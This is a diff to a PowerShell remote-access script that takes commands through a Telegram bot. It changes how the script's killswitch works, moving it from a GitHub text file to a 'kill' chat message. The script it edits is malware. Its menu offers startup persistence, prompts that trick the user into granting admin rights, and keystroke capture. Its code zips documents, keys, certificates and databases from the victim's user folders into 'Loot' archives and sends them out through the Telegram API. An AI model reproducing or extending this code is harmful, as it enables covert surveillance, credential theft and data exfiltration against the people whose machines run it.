@@ -1,10 +1,8 @@
 #------------------------------------------------ SCRIPT SETUP ---------------------------------------------------
 # Define User Variables
 $Token = "$tg"  # Your Telegram Token
-$GHurl = "$gh" # Your Url to a textfile (NOT REQUIRED)
 
 # Define Connection Variables
-$killphrase = "True"
 $PassPhrase = "$env:COMPUTERNAME"
 $URL='https://api.telegram.org/bot{0}' -f $Token
 $apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
@@ -65,6 +63,7 @@ AddPersistance   : Add Telegram C2 to Startup
 RemovePersistance   : Remove Startup Persistance
 IsAdmin   : Checks if session has admin Privileges
 AttemptElevate  : Send user a prompt to gain Admin
+Kill    : Killswitch for 'KeyCapture' and 'Exfiltrate' 
 
 =============================================="
 $params = @{chat_id = $ChatID ;text = $contents}
@@ -87,22 +86,10 @@ from all User Folders like Documents, Downloads etc..
 PATH
 Documents, Desktop, Downloads,
 OneDrive, Pictures, Videos.
-
 FILETYPE
 log, db, txt, doc, pdf, jpg, jpeg, png,
 wdoc, xdoc, cer, key, xls, xlsx,
 cfg, conf, docx, rft.
-
-======== Using the Killswitch Function ========
-
-(Used for the KeyCapture and Exfiltrate commands)
-set `$GHurl to an empty text file RAW url on github.
-Changing this file to contain the word 'True'
-will exit the current fuction and then
-the script will return to listen for further commands
-(can take a upto 5 mins to kill - be paitient..)
-To set URL from here type `$GHurl = 'YOUR_TEXTFILE_URL' 
-into the chat (before invoking the function!)
 
 =============================================="
 $params = @{chat_id = $ChatID ;text = $contents}
@@ -147,8 +134,8 @@ foreach ($folder in $foldersToSearch) {
                 $index++
                 $zipFilePath ="$env:temp/Loot$index.zip"
                 $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
-                $response = Invoke-RestMethod -Uri $GHurl
-                if ($response -match $killphrase) {
+                $messages=rtgmsg
+                    if ($messages.message.text -contains "kill") {
                     $contents = "$comp $env:COMPUTERNAME $closed Exfiltration Killed"
                     $params = @{chat_id = $ChatID ;text = $contents}
                     Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
@@ -217,6 +204,13 @@ While ($true){
                 }
             }
         }
+        $messages=rtgmsg
+        if ($messages.message.text -contains "kill") {
+        $contents = "$comp $env:COMPUTERNAME $closed KeyCapture Killed"
+        $params = @{chat_id = $ChatID ;text = $contents}
+        Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+        break
+        }
     }
     finally{
         If ($keyPressed) {
@@ -228,13 +222,6 @@ While ($true){
             $keyPressed = $false
             $nosave = ""
         }
-    }
-    $response = Invoke-RestMethod -Uri $GHurl
-    if ($response -match $killphrase) {
-        $contents = "$comp $env:COMPUTERNAME $closed KeyCapture Killed"
-        $params = @{chat_id = $ChatID ;text = $contents}
-        Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
-        break
     }
 $LastKeypressTime.Restart()
 Start-Sleep -Milliseconds 10
